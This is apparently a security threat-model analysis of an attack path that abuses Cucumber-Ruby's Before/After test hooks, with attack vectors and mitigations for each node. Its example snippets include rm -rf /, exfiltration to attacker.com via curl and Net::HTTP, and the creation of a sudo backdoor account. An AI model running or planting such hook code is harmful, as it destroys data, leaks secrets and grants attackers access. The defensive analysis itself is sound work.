**ATTACK TREE PATH:**

**Exploit Cucumber-Ruby's Environment Setup Hooks (Before/After) [HIGH RISK PATH]**

*   **Gain Write Access to Environment Configuration Files [CRITICAL NODE]**
    *   **Malicious Code in Hooks Executes During Test Execution [CRITICAL NODE] [HIGH RISK PATH]**
        *   **Execute Arbitrary System Commands [CRITICAL NODE]**

**Introduction:**

This attack path highlights a significant vulnerability in how Cucumber-Ruby's environment setup hooks (`Before` and `After` blocks) can be exploited if an attacker gains write access to the files where these hooks are defined. This path is classified as "HIGH RISK" due to the potential for complete system compromise and data exfiltration. The core issue lies in the fact that code within these hooks is executed with the same privileges as the test runner process.

**Detailed Analysis of Each Node:**

**1. Gain Write Access to Environment Configuration Files [CRITICAL NODE]:**

* **Description:** This is the initial and crucial step in the attack. The attacker needs to be able to modify the files where Cucumber's environment setup hooks are defined. These files are typically located in the `features/support` directory and often include files like `env.rb` or other custom support files.
* **Attack Vectors:**
    * **Compromised Development Environment:** If an attacker gains access to a developer's machine, they can directly modify these files. This could be through malware, phishing, or exploiting vulnerabilities in developer tools.
    * **Vulnerable Version Control System (VCS):** If the VCS repository (e.g., Git) is compromised due to weak credentials, misconfigurations, or vulnerabilities, an attacker can push malicious changes.
    * **Insecure Deployment Practices:** If the deployment process involves copying files without proper security checks or if the deployment server itself is compromised, attackers could inject malicious code into the relevant files.
    * **Supply Chain Attack:** A malicious dependency or a compromised development tool could inject malicious code into the environment files during the build or dependency installation process.
    * **Configuration Errors:**  Incorrect file system permissions on the server or in the development environment could allow unauthorized write access.
* **Impact:** Achieving this node allows the attacker to plant the seeds for the subsequent stages of the attack. Without write access, the attack cannot proceed.
* **Mitigation Strategies:**
    * **Secure Development Environments:** Implement strong security practices for developer machines, including regular patching, endpoint security solutions, and multi-factor authentication.
    * **Secure VCS Practices:** Enforce strong password policies, use multi-factor authentication for VCS access, regularly audit repository permissions, and implement code review processes.
    * **Secure Deployment Pipelines:** Automate deployments with security checks, use immutable infrastructure, and restrict access to deployment servers.
    * **Dependency Management:** Implement robust dependency management practices, including using dependency scanning tools to identify vulnerabilities and verifying the integrity of dependencies.
    * **Principle of Least Privilege:** Ensure that only necessary users and processes have write access to the relevant files.
    * **File Integrity Monitoring:** Implement systems to detect unauthorized modifications to critical files.

**2. Malicious Code in Hooks Executes During Test Execution [CRITICAL NODE] [HIGH RISK PATH]:**

* **Description:** Once the attacker has write access, they can insert malicious code into the `Before` or `After` hooks. These hooks are designed to execute code before or after each scenario or feature, providing a convenient place to set up or tear down test environments. However, this flexibility becomes a vulnerability if exploited.
* **Attack Vectors:**
    * **Direct Code Injection:** The attacker directly inserts malicious Ruby code into the hook definitions. This code could be designed to perform various malicious actions.
    * **Loading External Malicious Files:** The attacker could modify the hooks to require or load external Ruby files containing malicious code. This can help obfuscate the attack and make detection harder.
    * **Environment Variable Manipulation:** While not directly code execution, attackers could manipulate environment variables within the hooks to influence the behavior of the application or other processes during test execution. This could lead to unexpected and potentially harmful side effects.
* **Impact:** This is the core exploitation stage. When the Cucumber tests are executed, the malicious code within the hooks will be executed with the privileges of the test runner process. This can have severe consequences depending on the nature of the malicious code.
* **Example Malicious Code Snippets:**
    ```ruby
    Before do
      system("rm -rf /") # Highly dangerous - deletes all files
      # Or
      File.write("/tmp/secrets.txt", ENV.to_h.to_json) # Exfiltrates environment variables
      # Or
      require 'net/http'
      uri = URI('https://attacker.com/report')
      Net::HTTP.post_form(uri, 'data' => 'compromised') # Notifies attacker
    end

    After do
      # Clean up malicious files or processes
    end
    ```
* **Mitigation Strategies:**
    * **Code Reviews:** Regularly review changes to environment configuration files, especially the `features/support` directory.
    * **Static Analysis Security Testing (SAST):** Use SAST tools to scan the codebase for potentially malicious code patterns in the hooks.
    * **Principle of Least Privilege (for test runner):**  Run the test runner process with the minimum necessary privileges to limit the impact of any executed malicious code. This might involve using dedicated service accounts with restricted permissions.
    * **Input Validation (for hook parameters):** If your hooks accept external parameters, ensure they are properly validated and sanitized to prevent injection attacks.
    * **Sandboxing/Containerization:** Run tests in isolated environments (e.g., Docker containers) to limit the impact of malicious code execution. If the container is compromised, the damage is contained within the container.

**3. Execute Arbitrary System Commands [CRITICAL NODE]:**

* **Description:** The malicious code within the hooks can leverage Ruby's capabilities to execute arbitrary system commands. This grants the attacker complete control over the system where the tests are being run.
* **Attack Vectors:**
    * **`system()` and Backticks:** Ruby's `system()` method and backticks (` `) allow direct execution of shell commands.
    * **`IO.popen()`:** This method allows for more complex interactions with external processes, including capturing their output.
    * **Exploiting Application Vulnerabilities:** The malicious code could interact with the application itself, exploiting existing vulnerabilities to execute commands indirectly.
* **Impact:** This is the ultimate goal of this attack path. Successfully executing arbitrary system commands allows the attacker to:
    * **Data Exfiltration:** Steal sensitive data from the system.
    * **System Takeover:** Install backdoors, create new user accounts, and gain persistent access.
    * **Denial of Service (DoS):** Crash the system or disrupt its operations.
    * **Lateral Movement:** Use the compromised system as a stepping stone to attack other systems on the network.
    * **Malware Installation:** Install further malicious software.
* **Example Malicious Code Snippets (building on previous examples):**
    ```ruby
    Before do
      system("curl -X POST -H 'Content-Type: application/json' -d '{\"data\": \"secrets\"}' https://attacker.com/exfiltrate")
      # Or
      system("useradd -M -p 'P@$$wOrd' attacker")
      system("usermod -aG sudo attacker")
    end
    ```
* **Mitigation Strategies (building on previous nodes):**
    * **All mitigations from previous nodes are crucial here.** Preventing write access and malicious code execution is the primary defense.
    * **Security Audits:** Regularly audit the application and infrastructure for potential vulnerabilities that could be exploited by the malicious code.
    * **Network Segmentation:** Isolate the test environment from production and other sensitive networks to limit the impact of a successful attack.
    * **Intrusion Detection and Prevention Systems (IDPS):** Implement IDPS to detect and potentially block malicious activity originating from the test environment.
    * **Regular Security Assessments:** Conduct penetration testing and vulnerability assessments to identify weaknesses in the application and infrastructure.

**Overall Risk Assessment:**

This attack path represents a **critical security risk**. The ability to execute arbitrary system commands through compromised Cucumber hooks can lead to complete system compromise, data breaches, and significant operational disruption. The "HIGH RISK PATH" designation is accurate due to the potential for severe and widespread damage.
